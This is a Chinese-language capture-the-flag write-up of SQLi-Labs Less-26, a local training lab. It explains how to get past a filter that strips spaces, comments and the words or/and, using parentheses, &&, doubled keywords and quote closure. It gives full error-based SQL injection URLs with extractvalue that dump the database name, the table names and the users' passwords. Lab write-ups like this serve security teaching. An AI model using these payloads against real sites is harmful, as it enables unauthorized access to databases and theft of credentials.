【SQLi-Labs】Less-26 极致过滤与括号绕过 Writeup

操作者：何芊宏 | 操作日期：2026.10.26 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, 绕过过滤, 报错注入

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-26 (GET - Trick with comments - String)
  • 提示：极致过滤（空格、注释、or/and、/、\），单引号闭合，有报错回显。

2. 核心原理与绕过手法

本关卡的防御极其严苛，`preg_replace` 不仅过滤了 `or`、`and`，还过滤了 `#`、`--`、`/*`、`\s`（所有空白符）、`/` 和 `\`。这使得传统的 Payload 无法使用。

  • 无空格绕过：利用括号 () 作为天然的 Token 分隔符，代替空格。例如将 select database() 写成 select(database())。
  • 关键字绕过：使用 %26%26（即 &&）代替 and；双写 infoorrmation_schema 和 passwoorrd。
  • 无注释符绕过：由于注释符被过滤，采用对称闭合 %26%26'1'='1 强行补齐尾部单引号。
  • 报错注入：页面回显 mysql_error()，使用 extractvalue 规避空格限制，直接获取数据。

3. 操作步骤与解析

第一步：爆库名

输入 URL：?id=1'%26%26extractvalue(1,concat(0x7e,database()))%26%26'1'='1

回显现象：XPATH syntax error: '~security'。

第二步：爆表名（双写 + 括号代替空格）

输入 URL：?id=1'%26%26extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))))%26%26'1'='1

回显现象：XPATH syntax error: '~emails,referers,uagents,users'。

第三步：分段爆账号密码

由于报错回显限制为 32 字符，利用 substr 截取。

输入 URL：?id=1'%26%26extractvalue(1,concat(0x7e,(select(substr(group_concat(username,0x3a,passwoorrd),1,30))from(users))))%26%26'1'='1

回显现象：XPATH syntax error: '~Dumb:Dumb,Angelina:I-kill-you,'。

4. 知识点总结

  • 括号作分隔符：SQL 解析器遇到括号会自动切断 Token，完美平替被禁用的空格。
  • 综合绕过：将双写、符号替换、对称闭合组合使用，突破多重防御。
